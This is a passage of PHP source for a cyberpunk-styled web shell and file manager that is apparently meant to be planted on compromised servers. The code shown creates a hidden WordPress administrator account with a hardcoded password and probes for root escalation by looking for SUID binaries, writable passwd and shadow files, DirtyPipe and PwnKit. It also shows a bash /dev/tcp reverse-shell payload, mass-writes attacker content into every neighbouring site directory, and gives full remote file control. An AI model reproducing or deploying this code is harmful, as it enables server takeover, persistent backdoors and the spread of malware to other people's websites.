                    'user_pass'  => 'P@ssw0rd_Elv!',
                    'user_email' => 'elv@neon.local',
                    'role'       => 'administrator',
                    'display_name' => 'ELV Agent'
                );
                if(function_exists('wp_insert_user')) {
                    $uid = wp_insert_user($new_user);
                    if(!is_wp_error($uid)) {
                        $bypass_msg = "[+] SUCCESS! User 'elv_agent' / 'P@ssw0rd_Elv!' created as ADMIN.";
                    } else {
                        $bypass_msg = "[-] WP Error: " . $uid->get_error_message();
                    }
                } else {
                    $bypass_msg = "[-] wp_insert_user not available";
                }
            } else {
                $bypass_msg = "[-] wp-load.php not found!";
            }
            echo '<div class="console" style="border-top-color:'.($bypass_msg[1]=='+'?'var(--neon-cyan)':'var(--neon-magenta)').';"><pre style="color:'.($bypass_msg[1]=='+'?'var(--neon-cyan)':'var(--neon-magenta)').';">'.htmlspecialchars($bypass_msg).'</pre>';
            echo '<div class="neon-divider-thin"></div><a href="?d='.urlencode($dir).'" style="color:var(--neon-cyan);">[ BACK TO FILE MANAGER ]</a></div>';
        }
        // ==========================================
        // --- ACTION: AUTO ROOT EXEC ---
        // ==========================================
        elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
            $out = "[[ E.L.V AUTOMATED ROOT ENGINE v1.0 ]]\n";
            $out .= "[*] SYSTEM: " . php_uname() . "\n";
            $suids = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 20");
            $out .= $suids ? $suids : "[-] No SUID found.\n";
            $out .= "\n[*] KERNEL: " . php_uname('r') . "\n";
            $out .= "[*] Check DirtyPipe (CVE-2022-0847) if kernel 5.8-5.16\n";
            $out .= "[*] Check PwnKit (CVE-2021-4034) if pkexec exists\n";
            $passwd_w = is_writable('/etc/passwd') ? "[!] /etc/passwd IS WRITABLE!" : "[-] /etc/passwd not writable";
            $shadow_w = is_writable('/etc/shadow') ? "[!] /etc/shadow IS WRITABLE!" : "[-] /etc/shadow not writable";
            $out .= "\n{$passwd_w}\n{$shadow_w}\n";
            echo '<div class="console" style="border-top-color:var(--neon-purple); max-height:500px; overflow-y:auto;"><pre>'.htmlspecialchars($out).'</pre>';
            echo '<div class="neon-divider-thin"></div><a href="?d='.urlencode($dir).'" style="color:var(--neon-cyan); text-decoration:none; font-weight:700;">[ BACK TO FILE MANAGER ]</a></div>';
        }
        // ==========================================
        // --- ACTION: LAUNCH REV ---
        // ==========================================
        elseif(isset($_POST['launch_rev'])) {
            $rev_ip = $_POST['rev_ip'];
            $rev_port = intval($_POST['rev_port']);
            $rev_out = "[+] REVERSE SHELL LAUNCHED TO {$rev_ip}:{$rev_port}\n";
            $rev_out .= "[*] Payload: bash -c 'bash -i >& /dev/tcp/{$rev_ip}/{$rev_port} 0>&1'\n";
            $rev_out .= "[*] Executed in background...\n[!] Check your listener!\n";
            echo '<div class="console" style="border-top-color:var(--neon-magenta);"><pre style="color:var(--neon-cyan);">'.htmlspecialchars($rev_out).'</pre></div>';
        }
        // ==========================================
        // --- ACTION: MASS DEPLOY ---
        // ==========================================
        elseif(isset($_POST['mass_deploy'])) {
            $target_root = $_POST['target_root'];
            $file_name = $_POST['mass_name'];
            $content = $_POST['mass_content'];
            $count = 0;
            $injected_targets = [];
            if (is_dir($target_root)) {
                $folders = scandir($target_root);
                foreach ($folders as $folder) {
                    $path = $target_root . '/' . $folder;
                    if ($folder != '.' && $folder != '..' && is_dir($path)) {
                        if (@file_put_contents($path . '/' . $file_name, $content)) {
                            $count++;
                            $injected_targets[] = "[+] " . $folder . " -> " . $file_name;
                        }
                    }
                }
                $deploy_log = "MASS DEPLOYMENT RESULTS\n------------------------\n";
                $deploy_log .= "Target Root: {$target_root}\n";
                $deploy_log .= "File: {$file_name}\n";
                $deploy_log .= "Sectors Infected: {$count}\n\n";
                $deploy_log .= implode("\n", $injected_targets);
                if(empty($injected_targets)) $deploy_log .= "No directories were writable.";
            } else {
                $deploy_log = "ERROR: Target root not found!";
            }
            echo '<div class="console" style="border-top-color:var(--neon-yellow);"><pre>'.htmlspecialchars($deploy_log).'</pre></div>';
        }
        
        // ==========================================
        // --- FILE MANAGER VIEW (DEFAULT) ---
        // ==========================================
        if(!isset($_GET['mode']) && !isset($_GET['autoroot']) && !isset($_GET['revshell']) && !isset($_GET['wpbypass']) && !isset($_GET['semiauto']) && !isset($_POST['launch_rev']) && !isset($_GET['action']) && !isset($_POST['mass_deploy']) && !isset($_POST['do_bypass_b64']) && !isset($_POST['do_bypass_url'])): 
        
        // Get items in current directory
        $items = [];
        $files = @scandir($dir);
        if ($files) {
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;
                $path = $dir . '/' . $file;
                $items[] = [
                    'name' => $file,
                    'path' => $path,
                    'is_dir' => is_dir($path),
                    'size' => is_file($path) ? filesize($path) : 0,
                    'perm' => substr(sprintf('%o', fileperms($path)), -4),
                    'writable' => is_writable($path)
                ];
            }
        }
        ?>
<!-- ===== BREADCRUMB ===== -->
        <div class="breadcrumb">
            <a href="?d=<?= urlencode($base_shell) ?>" class="home-btn"><i class="fa-solid fa-house"></i> HOME</a>
            <span style="margin:0 6px; color:var(--text-dim);">|</span>
            <?php 
            $parts = explode('/', trim($dir, '/'));
            $cum = '';
            echo '<a href="?d=/" style="color:var(--text-primary); text-decoration:none; font-weight:700;">/</a>';
            foreach ($parts as $p) {
                $cum .= '/' . $p;
                echo '<span style="color:var(--text-dim); margin:0 5px;">▸</span>';
                echo '<a href="?d='.urlencode($cum).'" style="color:var(--text-primary); text-decoration:none; font-weight:700; transition:color 0.2s;">'.htmlspecialchars($p).'</a>';
            }
            ?>
            <span style="margin-left:auto; color:var(--text-dim); font-size:11px;">
                <i class="fa-regular fa-hard-drive" style="color:var(--neon-cyan);"></i> 
                <?= count($items) ?> items
            </span>
        </div>
        
        <!-- ===== NEON DIVIDER ===== -->
        <div class="neon-divider-thin"></div>
        
        <!-- ===== TOOLS ROW ===== -->
        <div class="tools">
            <div class="neon-cyan-box">
                <form method="post" enctype="multipart/form-data" style="display:flex; align-items:center; gap:6px;">
                    <input type="file" name="u_f" style="flex:1; margin:0;">
                    <button type="submit" class="btn-cyan-glow" style="padding:6px 10px;">UPLOAD</button>
                </form>
            </div>
            <div class="neon-cyan-box">
                <form method="post" style="display:flex; align-items:center; gap:6px;">
                    <input type="text" name="f_n" placeholder="new_file.php" style="flex:1; margin:0;">
                    <button type="submit" name="mk_f" class="btn-cyan-glow" style="padding:6px 10px;">CREATE</button>
                </form>
            </div>
            <div class="neon-cyan-box">
                <form method="post" style="display:flex; align-items:center; gap:6px;">
                    <input type="text" name="d_n" placeholder="new_folder" style="flex:1; margin:0;">
                    <button type="submit" name="mk_d" class="btn-cyan-glow" style="padding:6px 10px;">MKDIR</button>
                </form>
            </div>
        </div>
        
        <!-- ===== COPY/PASTE INDICATOR ===== -->
        <?php if(isset($_SESSION['copy_file'])): ?>
        <div style="margin-bottom:12px; text-align:right; border:1px dashed var(--neon-cyan); padding:8px; border-radius:4px; background:rgba(255,255,255,0.05);">
            <span style="color:var(--text-dim);">📋 Copied: </span>
            <span style="color:var(--neon-cyan); font-weight:700;"><?= htmlspecialchars(basename($_SESSION['copy_file'])) ?></span>
            <form method="post" style="display:inline; margin-left:12px;">
                <button type="submit" name="paste_f" class="btn-cyan-glow" style="padding:4px 10px; font-size:9px;">PASTE HERE</button>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- ===== FILE TABLE ===== -->
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th>NAME</th>
                        <th class="col-size">SIZE</th>
                        <th class="col-chmod">PERMS</th>
                        <th class="col-act">ACTIONS</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($dir !== '/'): ?>
                    <tr>
                        <td>
                            <span class="dir-label" data-type="dir">📁</span>
                            <a href="?d=<?= urlencode(dirname($dir)) ?>" class="item-t" data-writable="1" style="color:var(--neon-magenta) !important;">[ .. (parent) ]</a>
                        </td>
                        <td class="col-size">–</td>
                        <td class="col-chmod">–</td>
                        <td class="col-act">–</td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php 
                    $sorted_items = [];
                    $dirs = [];
                    $files_list = [];
                    foreach ($items as $item) {
                        if ($item['is_dir']) $dirs[] = $item;
                        else $files_list[] = $item;
                    }
                    usort($dirs, function($a,$b) { return strcasecmp($a['name'], $b['name']); });
                    usort($files_list, function($a,$b) { return strcasecmp($a['name'], $b['name']); });
                    $sorted_items = array_merge($dirs, $files_list);
                    
                    foreach ($sorted_items as $item):
                        $icon = $item['is_dir'] ? '📁' : '📄';
                        $size_display = $item['is_dir'] ? '–' : formatSize($item['size']);
                        $link = $item['is_dir'] ? '?d='.urlencode($item['path']) : '?edit='.urlencode($item['path']).'&d='.urlencode($dir);
                    ?>
                    <tr>
                        <td>
                            <span class="dir-label" data-type="<?= $item['is_dir'] ? 'dir' : 'file' ?>"><?= $icon ?></span>
                            <a href="<?= $link ?>" class="item-t" data-writable="<?= $item['writable'] ? '1' : '0' ?>"><?= htmlspecialchars($item['name']) ?></a>
                        </td>
                        <td class="col-size"><?= $size_display ?></td>
                        <td class="col-chmod">
                            <?php if($item['name'] !== '..'): ?>
                            <form method="post" style="display:inline-flex; align-items:center; gap:3px;">
                                <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
                                <input type="text" name="c_perm" value="<?= $item['perm'] ?>" class="<?= $item['writable'] ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:36px;">
                                <button type="submit" name="ch_mod" class="btn-gray" style="padding:2px 5px; font-size:9px;">CH</button>
                            </form>
                            <?php else: ?>
                            <span style="color:var(--text-dim);">–</span>
                            <?php endif; ?>
                        </td>
                        <td class="col-act">
                            <?php if($item['name'] !== '..'): ?>
                                <?php if(!$item['is_dir'] && preg_match('/\.zip$/i', $item['name'])): ?>
                                <form method="post" style="display:inline-block;">
                                    <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
                                    <button type="submit" name="unzip_f" class="btn-act-small" style="color:var(--neon-yellow);" title="UNZIP"><i class="fa-solid fa-file-zipper"></i></button>
                                </form>
                                <?php endif; ?>
                                <?php if(!$item['is_dir']): ?>
                                <a href="?d=<?= urlencode($dir) ?>&download=<?= urlencode($item['path']) ?>" class="btn-act-small act-dl" title="DOWNLOAD"><i class="fa-solid fa-download"></i></a>
                                <?php endif; ?>
                                <form method="post" style="display:inline-block;">
                                    <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
                                    <button type="submit" name="copy_f" class="btn-act-small act-cp" title="COPY"><i class="fa-regular fa-copy"></i></button>
                                </form>
                                <a href="?rename=<?= urlencode($item['path']) ?>&d=<?= urlencode($dir) ?>" class="btn-act-small" style="color:var(--neon-yellow);" title="RENAME"><i class="fa-regular fa-pen-to-square"></i></a>
                                <a href="?del=<?= urlencode($item['path']) ?>&d=<?= urlencode($dir) ?>" class="btn-act-small act-del" title="DELETE" onclick="return confirm('WIPE: <?= htmlspecialchars($item['name']) ?>?')"><i class="fa-regular fa-trash-can"></i></a>
                            <?php else: ?>
                            <span style="color:var(--text-dim);">–</span>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php endif; ?>
        
        <!-- ===== NEON DIVIDER ===== -->
        <div class="neon-divider"></div>
        
        <!-- ===== EDITOR MODE ===== -->
        <?php if(isset($_GET['edit']) && !isset($_POST['save_f'])): 
            $edit_path = $_GET['edit'];
            if(file_exists($edit_path) && is_file($edit_path) && is_readable($edit_path)):
                $file_content = htmlspecialchars(file_get_contents($edit_path));
        ?>
        <div style="margin-top:16px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                <h3 style="color:var(--neon-cyan); margin:0; text-shadow:0 0 6px rgba(0,229,255,0.3);">[ EDITING ] <?= htmlspecialchars(basename($edit_path)) ?></h3>
                <span style="color:var(--text-dim); font-size:11px;"><?= htmlspecialchars($edit_path) ?> | <?= strlen($file_content) ?> bytes</span>
            </div>
            <div class="neon-divider-thin"></div>
            <form method="post">
                <input type="hidden" name="f_path" value="<?= htmlspecialchars($edit_path) ?>">
                <textarea id="code_editor" name="f_cnt" style="width:100%; min-height:400px; background:rgba(255,255,255,0.07); border:1px solid var(--border-subtle); color:var(--text-primary); padding:15px; font-family:'Share Tech Mono',monospace; font-size:13px; border-radius:4px; outline:none; resize:vertical;"><?= $file_content ?></textarea>
                <div style="display:flex; gap:10px; margin-top:12px;">
                    <button type="submit" name="save_f" class="btn-editor-save" style="flex:1;">SAVE CHANGES</button>
                    <a href="?d=<?= urlencode($dir) ?>" class="btn-editor-cancel" style="flex:1;">CANCEL</a>
                </div>
            </form>
        </div>
        <?php 
            else:
                echo '<div class="alert" style="border-color:var(--neon-magenta); color:var(--neon-magenta);">[-] ERROR: FILE NOT READABLE: '.htmlspecialchars($edit_path).'</div>';
            endif;
        endif; 
        ?>
        
        <!-- ===== RENAME MODE ===== -->
        <?php if(isset($_GET['rename'])): 
            $rename_path = $_GET['rename'];
            $rename_basename = basename($rename_path);
        ?>
        <div style="border:2px solid var(--neon-yellow); background:rgba(255,255,255,0.05); padding:16px; border-radius:6px; margin-top:16px;">
            <h3 style="color:var(--neon-yellow); margin-top:0; text-shadow:0 0 6px rgba(255,238,0,0.3);">RENAME ITEM</h3>
            <div class="neon-divider-thin"></div>
            <form method="post" style="display:flex; gap:10px; align-items:center; margin-top:12px;">
                <span style="color:var(--text-secondary);"><?= htmlspecialchars($rename_basename) ?> →</span>
                <input type="text" name="new" value="<?= htmlspecialchars($rename_basename) ?>" style="flex:1; border-color:var(--neon-yellow);">
                <input type="hidden" name="old" value="<?= htmlspecialchars($rename_path) ?>">
                <button type="submit" name="rename" class="btn-cyan-glow" style="border-color:var(--neon-yellow); color:var(--neon-yellow); box-shadow:var(--glow-yellow);">RENAME</button>
                <a href="?d=<?= urlencode($dir) ?>" style="color:var(--neon-magenta); font-weight:700;">CANCEL</a>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- ===== NEON DIVIDER ===== -->
        <div class="neon-divider"></div>
        
        <!-- ===== FOOTER ===== -->
        <div class="glow-static">
            <span style="color:var(--neon-magenta); text-shadow:0 0 6px rgba(255,0,255,0.3);">E.L.V F.M v13.0</span> 
            <span style="color:var(--text-dim);">//</span> 
            <span style="color:var(--neon-cyan); text-shadow:0 0 6px rgba(0,238,255,0.3);">HxN</span> 
            <span style="color:var(--text-dim);">//</span> 
            <span style="color:var(--neon-yellow); text-shadow:0 0 6px rgba(255,238,0,0.3);">CYBERPUNK METROCITY</span>
        </div>
    </div>

    <!-- ===== JAVASCRIPT ===== -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
    <script>
    <?= $bg_terminal_js ?>
    
    // === LIGHT NEON PARTICLES (PURPLE & CYAN) ===
    (function() {
        const canvas = document.createElement('canvas');
        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1;pointer-events:none;opacity:0.4;';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        let W, H;
        function resize() { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
        window.addEventListener('resize', resize);
        resize();
        const particles = [];
        const colors = ['0,229,255', '138,43,226', '255,0,255', '75,0,130'];
        for (let i = 0; i < 50; i++) {
            particles.push({
                x: Math.random() * W, y: Math.random() * H,
                vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5,
                r: Math.random() * 2.5 + 0.5,
                color: colors[Math.floor(Math.random() * colors.length)],
                alpha: Math.random() * 0.3 + 0.05
            });
        }
        function animate() {
            ctx.clearRect(0, 0, W, H);
            particles.forEach(p => {
                p.x += p.vx; p.y += p.vy;
                if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
                if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(${p.color},${p.alpha})`;
                ctx.fill();
            });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < 150) {
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(138,43,226,${0.08 * (1 - dist/150)})`;
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animate);
        }
        animate();
    })();
    
    // === CODEMIRROR INIT ===
    document.addEventListener('DOMContentLoaded', function() {
        const editorTextarea = document.getElementById('code_editor');
        if (editorTextarea) {
            var editor = CodeMirror.fromTextArea(editorTextarea, {
                lineNumbers: true, matchBrackets: true,
                mode: 'application/x-httpd-php', theme: 'dracula',
                lineWrapping: true, indentUnit: 4, tabSize: 4
            });
            editor.setSize('100%', '400px');
            editor.focus();
        }
    });
    
    // === CONSOLE AUTO-SCROLL ===
    window.addEventListener('load', function() {
        const consoles = document.querySelectorAll('.console');
        consoles.forEach(c => {
            c.scrollTop = c.scrollHeight;
        });
    });
    
    // === GLOW ANIMATION FOR BUTTONS ===
    document.querySelectorAll('.btn-cyan-glow, .cyber-exec-btn').forEach(btn => {
        btn.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.03)';
        });
        btn.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    });
    
    // === TOOLTIP EFFECT FOR ACTION BUTTONS ===
    document.querySelectorAll('.btn-act-small').forEach(btn => {
        btn.addEventListener('mouseenter', function() {
            this.style.filter = 'brightness(1.4)';
        });
        btn.addEventListener('mouseleave', function() {
            this.style.filter = 'brightness(1)';
        });
    });
    
    // === DYNAMIC STATUS BAR UPDATE ===
    setInterval(() => {
        const footer = document.querySelector('.glow-static');
        if (footer) {
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const oldSpan = footer.querySelector('.time-stamp');
            if (oldSpan) oldSpan.remove();
            const span = document.createElement('span');
            span.className = 'time-stamp';
            span.style.cssText = 'color:var(--neon-cyan); font-size:10px; margin-left:12px; text-shadow:0 0 4px rgba(0,238,255,0.3);';
            span.textContent = '⏱ ' + timeStr;
            footer.appendChild(span);
        }
    }, 1000);
    </script>
</body>
</html>
<?php 
// End of main content area
ob_end_flush(); 
?>